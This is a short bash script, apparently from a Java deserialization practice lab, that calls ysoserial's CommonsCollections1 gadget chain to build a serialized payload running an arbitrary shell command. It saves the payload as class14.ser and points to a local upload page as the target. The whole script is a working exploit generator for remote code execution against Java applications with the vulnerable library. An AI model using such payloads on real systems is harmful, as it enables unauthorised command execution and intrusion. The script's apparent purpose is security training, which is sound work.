#!/bin/bash
# class14 — CC1链 (CommonsCollections1)
# 靶场: /class14/upload
# 注意: JDK 8u71+ 修补了 AnnotationInvocationHandler
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.base/sun.reflect.annotation=ALL-UNNAMED
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.management/javax.management=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections1 "$CMD" > ../../class14.ser 2>&1 | grep -v "^$"
echo "✅ 已生成: class14.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class14/"
